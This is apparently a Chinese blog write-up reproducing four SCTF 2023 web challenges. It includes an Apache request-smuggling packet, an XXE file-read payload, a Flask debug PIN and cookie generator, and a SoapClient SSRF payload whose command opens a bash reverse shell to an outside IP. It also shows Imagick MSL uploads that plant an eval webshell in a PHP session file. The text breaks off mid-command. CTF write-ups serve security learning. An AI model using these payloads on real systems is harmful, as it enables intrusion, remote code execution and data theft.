[{"title":"SCTF-Web复现","url":"/2023/06/25/SCTF-Web复现/","content":"\n# SCTF-Web复现\n\n## ezcheck1n\n\n题目代码逻辑如下，主要逻辑是从参数中获取url参数，然后把flag变量拼接到url后面，之后发过去，其实就是个外带回显\n\n```php\n<?php\n\n$FLAG = \"flag{fake_flag}\";\n@file_get_contents(\"http://\".$_GET['url'].$FLAG);\n# but it's not the real flag\n# beacuse someone say this year is not 2023 !!! like the post?\nshow_source('./2023.php');\n$a = file_get_contents('./post.jpeg');\necho '<img src=\"data:image/jpeg;base64,' . base64_encode($a) . '\">';\n# notice -> time\n# How should you get to where the flag is, the middleware will not forward requests that are not 2023\n?>\n```\n\n尝试一下：\n\n![image-20230624144319581](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624144319581.png)\n\n```tex\nroot@VM-24-4-ubuntu:~# nc -lvnp 7777\nListening on 0.0.0.0 7777\nConnection received on 115.239.215.75 54096\nGET /flag{fake_flag} HTTP/1.0\nHost: 43.143.246.73:7777\nConnection: close\n```\n\n这里有两个地方很奇怪，一个是传参的时候，用`?url=xxxx:xxxx/`这种形式传递是不行的，还有就是我并没有在2023.php下进行参数传递也可以通，其实这两个问题都是一个原因，就是apache的Rewrite规则，相信如果了解过apache-Rewrite的师傅肯定不陌生，它采用的是正则匹配的方式，随便一猜也可以猜的出来匹配的是/2023/（正则内容），然后将正则内容作为参数转交给其他逻辑（2023.php）处理。所以此时我们可以理解成在url前面已经有一个默认的参数了，就不能用?进行传参，而是用&拼接第二个参数，所以其实这样传也是可以的（这里我可能理解的不够深，如果有师傅有其他理解也吗麻烦指正一下）：\n![image-20230624144805079](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624144805079.png)\n\n然后f12在相应header中可以看到apache的版本是2.5.4，这个版本的apche存在走私漏洞，说白了就是可以在一次请求中发送多个数据包请求，参考文章如下：https://forum.butian.net/share/2180：\n![image-20230624145004531](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624145004531.png)\n\n然后就到了这道题最抽象的地方，就是对出题人的脑洞，这些提示其实就是告诉我们中间件能解析的请求是2023的，但是真正的flag却不在2023中，谜语翻译过来就是要用走私构造一个2023的数据包来绕过中间件，然后再构造一个访问2022.php的数据包拿到flag：\n\n```tex\n# but it's not the real flag\n# beacuse someone say this year is not 2023 !!! like the post?\nshow_source('./2023.php');\n# notice -> time\n# How should you get to where the flag is, the middleware will not forward requests that are not 2023\n```\n\n然后这里赛后又复现了一遍，貌似是环境寄了，拿当时比赛时打通的payload和各种其他师傅的payload全是超时，数据包大概就这么构造：\n\nburp随便抓个包存到pre.txt中，然后写个脚本把里面空格替换成%20，换行替换成%0d%0a：\n\n```python\nimport os\n\nhttptext = \"\"\nf = open('pre.txt', 'r')\n#### 读取文件内容，将每一行中的空格替换为%20 ####\nfor line in f.readlines():\n    line = line.replace(' ', '%20')\n    # print(line)\n    #### 将每一行的\\n替换为%0d%0a ####\n    #### 并存储到httptext中 ####\n    httptext = httptext + line.replace('\\n', '%0d%0a')\nf.close()\nhttptext = httptext + \"\"\nprint(httptext)\n```\n\n之后再构造出第二个数据包就行了，然后第二个数据包访问的路由和参数是`2022.php?url=vpsip:port/`，然后两个数据包之间用%0d%0a%0d%0a进行拼接就可以了，最后构造好的包文是这样的（比赛时打通的）：\n\n```tex\nGET /2023/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/2022.php%3furl%3d43.143.246.73%3a7777 HTTP/1.1\nHost: 115.239.215.75:8082\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://115.239.215.75:8082/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n```\n\n![image-20230624153802426](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624153802426.png)\n\n## pypyp?\n\n先来点小脑洞，进入环境之后说没有Session，这里是php的Session，可能很多人会误解成Python的Session，然后可以利用PHP_SESSION_UPLOAD_PROGRESS在客户端强行创建一个Session，并且`session.upload_progress.name`这个属性（Session全局数组中的key）是可控的，我们可以通过POST一个恶意的PHP_SESSION_UPLOAD_PROGRESS字段，并且这个字段的Value就是这个`session.upload_progress.name`。\n\n> Session Upload Progress 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中，此时即使用户没有初始化Session，PHP也会自动初始化Session。而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化Session。\n\n从上面官方给出的定义中可以知道PHP_SESSION_UPLOAD_PROGRESS是一个用来统计文件上传进度的Session，所以我们可以写一个表单，POST一个PHP_SESSION_UPLOAD_PROGRESS字段，并加入一个文件上传，就可以获取到伪造的表单提交包文了：\n\n```html\n<!doctype html>\n<html>\n<body>\n<form action=\"http://xxxxx/index.php\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n</body>\n</html>\n\n```\n\n上传文件并抓包可以拿到这样的包文：\n\n![image-20230624213220127](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624213220127.png)\n\n改造题目环境的包文，绕过第一关：\n\n![image-20230624213300251](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624213300251.png)\n\n拿到题目源码如下：\n\n```php\n<?php\n    error_reporting(0);\n    if(!isset($_SESSION)){\n        die('Session not started');\n    }\n    highlight_file(__FILE__);\n    $type = $_SESSION['type'];\n    $properties = $_SESSION['properties'];\n    echo urlencode($_POST['data']);\n    extract(unserialize($_POST['data']));\n    if(is_string($properties)&&unserialize(urldecode($properties))){\n    $object = unserialize(urldecode($properties));\n    $object -> sctf();\n    exit();\n    } else if(is_array($properties)){\n        $object = new $type($properties[0],$properties[1]);\n    } else {\n        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n    }\n    echo \"this is the object: $object <br>\";\n\n?>\n```\n\n先看第一部分，有个变量覆盖`  extract(unserialize($_POST['data']));`，也就是说我们可以通过传入一个数组来覆盖上面$type和$properties的值，再往下看发现有一个判断：\n\n```php\nif(is_array($properties)){\n        $object = new $type($properties[0],$properties[1]);\n    }\n```\n\n如果$properties是一个数组，就new一个$type对象，并且传入参数为`$properties[0],$properties[1]`，那么我们可以让$type为`SimpleXMLElement`这个原生类，这个原生类可以解析一个XML文档，并且初始化时参数如下，需要注意的是第三个参数`data_is_url`，默认为false，也就是第一个参数data需要传入一个xml：\n![image-20230624222702721](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624222702721.png)\n\n这样的话我们就可以构造出一个payload，从而实现XXE，这样我们就实现了任意文件读取：\n\n```php\n<?php\n$pro = array('<?xml version=\"1.0\" ?><!DOCTYPE ANY[<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><root>&xxe;</root>',2);\n$arr = array(\"properties\"=>$pro,\"type\"=>SimpleXMLElement);\n// print_r($arr);\nprint_r(serialize($arr));\n```\n\n![image-20230624224532021](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624224532021.png)\n\n再看else的部分，如果$properties不是数组，就会访问远程的一个服务，题目提示了/app/app.py，我们这里xxe看一下代码：\t\n\n```php\nif(is_array($properties)){\n        $object = new $type($properties[0],$properties[1]);\n    } else {\n        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n    }\n```\n\n发现Flask服务开启了debug，算pin码就可以了：\n\n![image-20230624230721367](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624230721367.png)\n\n放个算pin码的脚本，还能顺带算出cookie，方便后面直接用：\n\n项目地址：https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code/blob/main/get_flask_pin_and_cookie.py\n\n```python\n#!/usr/bin/python3\n\n# Tested on Python3.8\n# This script generates a Cookie based on a legitimate PIN code.\n\n# If you are using a Python version lower than 3.8 and you were unable to generate a Cookie or PIN, use the script at the link below.\n# It is based on the following script, which generates only the PIN code:\n# https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get_flask_pin.py\n\n# In different versions of python, the hashing algorithm may differ, in this case, sha1 is used.\n# There may also be other differences.\n\nimport argparse\nimport os\nimport getpass\nimport sys\nimport hashlib\nimport time\nimport uuid\nfrom itertools import chain\n\ntext_type = str\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\ndef get_pin(args):\n    rv = None\n    num = None\n    username = args.username\n    modname = args.modname\n    appname = args.appname\n    fname = args.basefile\n    probably_public_bits = [username, modname, appname, fname]\n    private_bits = [args.uuid, args.machineid]\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, text_type):\n            bit = bit.encode('utf-8')\n        h.update(bit)\n    h.update(b'cookiesalt')\n\n    cookie_name = '__wzd' + h.hexdigest()[:20]\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b'pinsalt')\n        num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                              for x in range(0, len(num), group_size))\n                break\n        else:\n            rv = num\n\n    hash_pin(rv)\n    print(\"Cookie: \", cookie_name + \"=\" + str(int(time.time())) + '|' + hash_pin(rv))\n    return rv\n\n\nif __name__ == \"__main__\":\n    versions = [\"2.7\", \"3.0\", \"3.1\", \"3.2\", \"3.3\", \"3.4\", \"3.5\", \"3.6\", \"3.7\", \"3.8\"]\n    parser = argparse.ArgumentParser(description=\"tool to get the flask debug pin from system information\")\n    parser.add_argument(\"--username\", required=False, default=\"www-data\",\n                        help=\"The username of the user running the web server\")\n    parser.add_argument(\"--modname\", required=False, default=\"flask.app\",\n                        help=\"The module name (app.__module__ or app.__class__.__module__)\")\n    parser.add_argument(\"--appname\", required=False, default=\"Flask\",\n                        help=\"The app name (app.__name__ or app.__class__.__name__)\")\n    parser.add_argument(\"--basefile\", required=False,\n                        help=\"The filename to the base app.py file (getattr(sys.modules.get(modname), '__file__', None))\")\n    parser.add_argument(\"--uuid\", required=True,\n                        help=\"System network interface UUID (/sys/class/net/ens33/address or /sys/class/net/$interface/address)\")\n    parser.add_argument(\"--machineid\", required=True,\n                        help=\"System machine ID (非docker环境：/etc/machine-id  docker环境： /proc/sys/kernel/random/boot_id+/proc/self/cgroup)\")\n\n    args = parser.parse_args()\n    if args.basefile is None:\n        print(\"[!] App.py base path not provided, trying for most versions of python\\n\")\n        for v in versions:\n            args.basefile = f\"/usr/local/lib/python{v}/dist-packages/flask/app.py\"\n            print(f\"PIN Python {v}: {get_pin(args)}\\n\")\n    else:\n        print(\"PIN: \", get_pin(args))\n```\n\n其中需要获取的参数的方法如下：\n\n- username：通过查看/etc/passwd可以看到全部的用户，有一个叫做app的，是这个用户\n\n- modename：默认值为flask.app，不需要改\n\n- appname：默认值为Flask，不需要改\n\n- basefile：app.py的存放位置，这里可以猜，大部分默认都是`/usr/lib/python3.x/site-packages/flask/app.py`，这里python版本是3.8（猜的），也可以通过FileSystemIterator这个原生类来看一下具体的版本：\n\n  ![image-20230625191325115](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191325115.png)\n\n- uuid：一般读取这个文件：`/sys/class/net/eth0/address`的十进制\n\n- machineid：题目是docker环境，所以是`/proc/sys/kernel/random/boot_id`后拼接`/proc/sys/kernel/random/boot_id+/proc/self/cgroup`的docker部分\n\n算出pin码和cookie为：\n\n![image-20230625191641000](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191641000.png)\n\n然后就可以进入console中执行命令了，我们可以本地起一个Flask进入到调试模式中执行命令看看传参是什么样的：\n\n![image-20230625191950887](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625191950887.png)\n\n抓一下输入pin码时的包：\n\n![image-20230625192202208](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192202208.png)\n\n再抓一个console中执行命令时的包（这里就会发现执行命令时是需要Cookie的，这时候之前算好的Cookie就派上用场了），然后这里发现参数是需要传入一个s的，也就是Flask服务的SecretKey，我们去访问题目环境的console路由就可以看到：\n![image-20230625192245257](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192245257.png)\n\n![image-20230625192559845](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625192559845.png)\n\n然后就可以构造RCE的数据包了，我们现在有RCE所需的参数，然后考虑是否可以通过这里传参从而RCE，答案是不行的，因为Cookie没办法传过去：\n\n```php\n $object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n```\n\n所以我们又要通过一个原生类来构造SSRF，从而访问5000端口的这个Flask服务了，用到的是SoapClient这个原生类，可以理解成直接对target发起一次请求：\n\n> ```php\n> SoapClient {\n>     /* 方法 */\n>     public __construct ( string|null $wsdl , array $options = [] )\n>     public __call ( string $name , array $args ) : mixed\n> ```\n>\n> 可以看到，该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call` 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\n>\n> 该类的构造函数如下：\n>\n> ```php\n> public SoapClient :: SoapClient(mixed $wsdl [，array $options ])\n> ```\n>\n> - 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。\n> - 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。\n\n看到这段代码：\n\n```php\nif(is_string($properties)&&unserialize(urldecode($properties))){\n$object = unserialize(urldecode($properties));\n$object -> sctf();\n```\n\n可以看到$object调用了sctf()这个方法，其实就是调用_call然后打SSRF\n\n构造出如下payload：\n\n```php\n<?php\n$sop = new SoapClient(null,array('user_agent'=>\"test\\r\\nCookie: __wzdb2a60e2b19822632a67c=1687701860|11b8517fb9fb\",'location'=>'http://127.0.0.1:5000/console?__debugger__=yes&cmd=__import__(\"os\").popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20/dev/tcp/43.143.246.73/7777%200%3E%261%5C%22%22)&frm=0&s=DhOJxtvMXCtezvKtqaK9','uri'=>'test'));\n$arr = array(\"properties\"=>urlencode(serialize($sop)));\n$b = serialize($arr);\necho $b;\n```\n\n拿到shell后直接suid提权就可以读取flag\n\n![image-20230625221633078](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625221633078.png)\n\n![image-20230625221745358](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230625221745358.png)\n\n## fumo_backdoor\n\n题目源码：\n\n```php\n<?php\nerror_reporting(0);\nini_set('open_basedir', __DIR__.\":/tmp\");\ndefine(\"FUNC_LIST\", get_defined_functions());\n\nclass fumo_backdoor {\n    public $path = null;\n    public $argv = null;\n    public $func = null;\n    public $class = null;\n    \n    public function __sleep() {\n        if (\n            file_exists($this->path) && \n            preg_match_all('/[flag]/m', $this->path) === 0\n        ) {\n            readfile($this->path);\n        }\n    }\n\n    public function __wakeup() {\n        $func = $this->func;\n        if (\n            is_string($func) && \n            in_array($func, FUNC_LIST[\"internal\"])\n        ) {\n            call_user_func($func);\n        } else {\n            $argv = $this->argv;\n            $class = $this->class;\n            \n            new $class($argv);\n        }\n    }\n}\n\n$cmd = $_REQUEST['cmd'];\n$data = $_REQUEST['data'];\n\nswitch ($cmd) {\n    case 'unserialze':\n        unserialize($data);\n        break;\n    \n    case 'rm':\n        system(\"rm -rf /tmp 2>/dev/null\");\n        break;\n    \n    default:\n        highlight_file(__FILE__);\n        break;\n}\n```\n\n### 整体思路\n\n这道题利用的是`PHPimagick`拓展的特性，该拓展可以实现对各种格式图片的各种操作，并且imagic类在实例化时可以执行`Magick Scripting Language`，其形式就是一段xml，如下一段MSL（Magick Scripting Language）可以将attack.php中的内容读取（即支持远程也支持本地），并写入到victime.txt中（write时文件不存在会自动创建）：\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n <read filename=\"http://xxxx.xxxx:8080/attack.php\" />\n <write filename=\"/tmp/victim.txt\" />\n</image>\n```\n\n然后这道题用open_basedir限制了访问路径必须是/tmp，那么我们就可以用上面这个办法来把/flag移动到/tmp下进行读取。\n\n利用点在_sleep中，也就是说我们要人为的触发fumo_backdoor的对象的`__sleep`函数，并且这个对象的path属性是我们在移动后的flag的路径（/tmp/xxxx），`__sleep`函数是在对象序列化时触发的，那么我们应该如何人为的实例化一个fumo_backdoor对象？\n\n```php\n    public function __sleep() {\n        if (\n            file_exists($this->path) && \n            preg_match_all('/[flag]/m', $this->path) === 0\n        ) {\n            readfile($this->path);\n        }\n    }\n```\n\n这里利用的就是php的session了，php的session默认存放位置在/tmp下，默认名字为sess_xxxxxx，并且session里面的内容是以序列化的形式存在的，当客户端发来携带着PHPSESSID的请求时，对应sessionID的session就会反序列化后装载到$__SESSION数组中，当php程序运行结束后又会将Session序列化回去储存起来，所以整到题大体思路如下：\n\n- 通过MSL将/flag写入到/tmp/下的任意一文件中\n- 通过MSL将一段序列化数据写入到/tmp/sess_xxxxx中，这段序列化的数据中是一个fumo_backdoor对象，并且path为/tmp/flag名字\n- 访问时携带`Cookie: PHPSESSID=xxxxx`来调用这个session进行序列化，从而执行里面fumo_backdoor对象的`__sleep`方法，读取flag\n\n### 复现流程\n\n环境给了可以执行无参函数的点，看一下phpinfo，发现开启了imagic拓展：\n![image-20230627164353391](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230627164353391.png)\n\n还是用pypyp那道题的上传表单抓个包，然后构造出如下数据包发送上传数据，在php中上传的数据会以phpXXXXXX（X是A-Z、a-z、1-9中的字符拼起来的随机字符串）存到/tmp下，所以这时我们传入的这一段msl就会以phpXXXXXX的文件名储存起来，我们要执行这其中的代码就可以用new Imagic('vid:msl:/tmp/php*')这种方法，`msl://`用来执行一段msl代码，`vid://`中可以使用通配符来表示路径，这样根目录下的flag就被我们移动到/tmp下了，名字为sess：\n\n```tex\nPOST /?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&cmd=unserialze HTTP/1.1\nHost: 127.0.0.1:18080\nCache-Control: max-age=0\nsec-ch-ua: \"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBnq6Y9OQrGIyzsLe\nContent-Length: 362\n\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe\n\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe\nContent-Disposition: form-data; name=\"test\"; filename=\"test.msl\"\nContent-Type: application/octet-stream\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n <read filename=\"mvg:/flag\" />\n <write filename=\"/tmp/sess\" />\n</image>\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe--\n\n```\n\n![image-20230627205717400](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230627205717400.png)\n\n我们构造另一个数据包，上传的文件是一张ppm格式的图片，我们需要在里面添加序列化后的数据，至于为什么要选用ppm格式原因如下：\n\n> 写入文件时须注意以下几点：\n>\n> 1. 因为`imagick`对文件格式解析较严，需要写入的文件必须是其支持的图片格式，如jpg、gif、ico等。如果直接插入`session`数据，会导致解析图片错误，导致文件无法写入。\n> 2. `php`对`session`的格式解析也较为严格。数据尾不可以存在脏数据，否则`session`解析错误会无法触发`__sleep`。\n>\n> 所以我们需要找到一个容许在末尾添加脏数据，且脏数据不会被`imagick`抹去的图片格式。`imagick`共支持几十种图片格式，\n>\n> 题目提示可以使用`ppm`格式，其不像其他图片格式存在`crc`校验或者在文件末尾存在`magic`头。结构十分简单，可以进行利用。\n\n发包：\n\n```tex\nPOST /?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&cmd=unserialze HTTP/1.1\nHost: 127.0.0.1:18080\nCache-Control: max-age=0\nsec-ch-ua: \"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBnq6Y9OQrGIyzsLe\nContent-Length: 743\n\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe\n\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe\nContent-Disposition: form-data; name=\"test\"; filename=\"test.msl\"\nContent-Type: application/octet-stream\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n <read filename=\"inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo5OiIvdG1wL3Nlc3MiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=\" />\n <write filename=\"/tmp/sess_y1\" />\n</image>\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe--\n\n```\n\n传完这个包后sess_y1就生成好了：\n\n![image-20230627205811171](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230627205811171.png)\n\n再用session_start函数然后带着PHPSESSID访问即可：\n\n```tex\nGET /?data=O:13:\"fumo_backdoor\":4:{s:4:\"path\";N;s:4:\"argv\";N;s:4:\"func\";s:13:\"session_start\";s:5:\"class\";N;}&cmd=unserialze HTTP/1.1\nHost: 127.0.0.1:18080\nCache-Control: max-age=0\nsec-ch-ua: \"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nCookie: PHPSESSID=y1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n```\n\n![image-20230627205901948](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230627205901948.png)\n\n## hellojava\n\n代码反编译后核心路由如下：\n\n```java\nimport com.Sctf.bean.Hello;\nimport com.Sctf.bean.MyBean;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.sun.org.apache.xerces.internal.impl.dv.util.Base64;\nimport java.io.ByteArrayInputStream;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport scala.collection.immutable.LazyList;\n\n@RestController\npublic class SCtfController {\n    public SCtfController() {\n    }\n\n    @RequestMapping({\"/\"})\n    public String index() {\n        return \"Welcome~\";\n    }\n\n    @RequestMapping({\"/Hello/{BaseJson}\"})\n    public String Hello(@PathVariable String BaseJson, @RequestBody String param) {\n        ObjectMapper mapper = new ObjectMapper();\n\n        try {\n            MyBean user = (MyBean)mapper.readValue(Base64.decode(BaseJson), MyBean.class);\n            if (user.getIfInput()) {\n                InputStream inputStream = new ByteArrayInputStream(java.util.Base64.getDecoder().decode(param));\n                NoObjectInputStream NoInputStream = new NoObjectInputStream(inputStream);\n                Object obj = NoInputStream.readObject();\n                String HelloList = (new Hello()).DoSomething((LazyList)obj);\n                return HelloList;\n            }\n        } catch (Exception var9) {\n            var9.printStackTrace();\n        }\n\n        return \"HelloList\";\n    }\n```\n\n 首先是这个地方，会有一次Jackson数据的反序列化，然后会从这个反序列化的对象中取出IFInput的值，必须要为true通过这个判断才能进入代码块触发反序列化，而这里可以发现在MyBean这个类中，IfInput这个属性是打了`@JacksonInject`注解，也就是说这个属性是不能被我们传入的json数据所赋值的，考虑这里怎么绕过给IfInput传入为true\n\n```java\n @JsonCreator\n    public MyBean(@JsonProperty(\"Base64Code\") String Base64Code, @JacksonInject Boolean IfInput) {\n        this.Base64Code = Base64Code;\n        this.IfInput = IfInput;\n    }\n```\n\n当前版本下会存在一个Jackson对Json对象的解析漏洞，当传入一个空键名时，其键值会被赋值给被`@JacksonInject`注解标注的属性，所以我们可以构造如下json数据进行绕过（后面的Base64Code的值任意）：\n\n```json\n{\"\":true,\"Base64Code\":\"AAAAAAAA\"}\n```\n\n然后就是构造反序列化，这里要打的是Jackson的反序列化，(用的是POJONode这条)，然后在打进去之前可以发现在` NoObjectInputStream`中会对传入的序列化数据进行黑名单检查，然后这个检查的黑名单是从backlist.txt中读出来的：\n\n```java\npublic class NoObjectInputStream extends ObjectInputStream {\n    private List<String> list = Blacklist.readBlackList(\"security/blacklist.txt\");\n\n    public NoObjectInputStream(InputStream inputStream) throws IOException {\n        super(inputStream);\n        System.out.println(this.list);\n    }\n\n    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {\n        if (this.list.contains(desc.getName())) {\n            throw new InvalidClassException(\"Unauthorized deserialization attempt\", desc.getName());\n        } else {\n            return super.resolveClass(desc);\n        }\n    }\n```\n\n再看依赖，发现存在scala这个依赖，这个依赖在这个版本下存在反序列化漏洞，可以清楚文件内容\n\n![image-20230628200127113](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230628200127113.png)\n\nggc：https://github.com/yarocher/lazylist-cve-poc/tree/main\n\n这个poc的maven编译环境是jdk1.11，所以需要将bash的环境变量调整到jdk1.11的版本才能运行，运行命令如下：\n\n```bash\n mvn clean package\n \n mvn -q exec:java -Dexec.mainClass=\"poc.cve.lazylist.payload.Main\" -Dexec.args=\"security/balcklist.txt 